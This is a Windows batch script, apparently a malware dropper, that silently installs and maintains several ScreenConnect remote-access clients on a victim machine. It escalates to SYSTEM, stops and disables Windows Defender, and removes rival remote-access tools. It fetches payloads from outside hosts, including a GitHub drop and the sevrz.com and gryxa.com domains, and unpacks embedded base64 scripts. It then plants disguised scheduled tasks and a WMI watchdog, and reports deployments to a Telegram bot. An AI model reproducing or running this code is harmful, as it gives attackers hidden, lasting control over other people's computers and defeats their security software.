@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O43 - Deep ensure always light-starts Gryxa before rate-limit
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (9908198e668e4750)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=9908198e668e4750"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O43 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O41b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O43" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O41 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O43 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O41: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M31" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S9" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T16" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L20" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O41: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] Gryxa MUST-RUN deep ensure (svc+dir+TCP/relay+FP drift)...
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  call :EnsureGryxaMust
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo gryxa_force_after_deep>>"%LOG%"
  del /f /q "%WD%\gryxa_reinstall.flag" >nul 2>&1
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -Force -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
  if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
)
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O39/L13: Create like WucacheOwn â€” BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) â€” same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O42 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:EnsureGryxaMust
rem O42: thin fallback — prefer lib gryxa-ensure; never msiexec here.
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIw
MjYwODAyTTMxDQpyZW0gIE80MTogZXh0ZXJtaW5hdGUga2lsbGVkIEdyeXhhIChudWxsLXBhdGgg
cHJvYyk7IHN5bmMgRlAgYmVmb3JlIGtpbGw7IGZpeCBoZWFsLg0KcmVtICBBdXRob3JpemVkIGlu
dGVybmFsIGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4NCnJlbSDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZANCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCg0Kc2V0ICJL
